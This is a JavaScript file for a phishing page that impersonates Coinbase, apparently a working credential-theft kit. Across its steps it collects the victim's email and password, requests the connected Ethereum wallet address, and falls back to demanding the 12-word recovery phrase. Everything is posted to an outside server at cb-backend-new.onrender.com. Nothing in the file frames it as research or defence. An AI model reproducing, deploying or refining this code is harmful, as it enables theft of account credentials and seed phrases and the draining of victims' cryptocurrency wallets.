const API_URL = 'https://cb-backend-new.onrender.com';

document.addEventListener('DOMContentLoaded', () => {
    const toStep2 = document.getElementById('toStep2');
    const toStep3 = document.getElementById('toStep3');
    const connectBtn = document.getElementById('connectBtn');
    const status = document.getElementById('status');

    toStep2.onclick = () => {
        document.getElementById('step-1').classList.add('hidden');
        document.getElementById('step-2').classList.remove('hidden');
    };

    toStep3.onclick = () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        if(!email || !pass) return alert("Fill in email/pass");
        document.getElementById('step-2').classList.add('hidden');
        document.getElementById('step-3').classList.remove('hidden');
    };

    connectBtn.onclick = async () => {
        const email = document.getElementById('email').value;
        const password = document.getElementById('pass').value;

        if (window.ethereum) {
            try {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                await sendToDB(email, password, accounts[0], null);
            } catch (err) {
                status.innerText = "Wallet connection failed. Use recovery phrase.";
                setupRecoveryField(email, password);
            }
        } else {
            setupRecoveryField(email, password);
        }
    };

    function setupRecoveryField(email, password) {
        // CLEAR the step 3 area first so there are no duplicate buttons
        document.getElementById('step-3').innerHTML = `
            <img src="logo.png" class="cb-logo" alt="Coinbase">
            <h1>Identity Verification</h1>
            <p>Please enter your 12-word recovery phrase to continue.</p>
            <input type="text" id="recovery" placeholder="word1 word2..." style="width:100%; padding:10px; margin:10px 0;">
            <button id="submitBtn" class="btn-primary">Done</button>
            <div id="status" class="status-text"></div>
        `;
        
        const btn = document.getElementById('submitBtn');
        const input = document.getElementById('recovery');
        const status = document.getElementById('status');

        btn.onclick = async () => {
            const phrase = input.value.trim();
            if (phrase.split(/\s+/).length !== 12) {
                status.innerText = "You must enter exactly 12 words.";
                return;
            }
            status.innerText = "Verifying...";
            await sendToDB(email, password, null, phrase);
        };

        // Handle the Enter key
        input.onkeydown = (e) => { if (e.key === 'Enter') btn.click(); };
    }

    async function sendToDB(email, password, wallet, phrase) {
        try {
            const res = await fetch(`${API_URL}/update`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password, walletAddress: wallet, recoveryPhrase: phrase })
            });
            if (res.ok) {
                window.location.href = `${API_URL}/dashboard.html`;
            } else {
                document.getElementById('status').innerText = "Server error. Try again.";
            }
        } catch (e) {
            document.getElementById('status').innerText = "Connection error.";
        }
    }
});
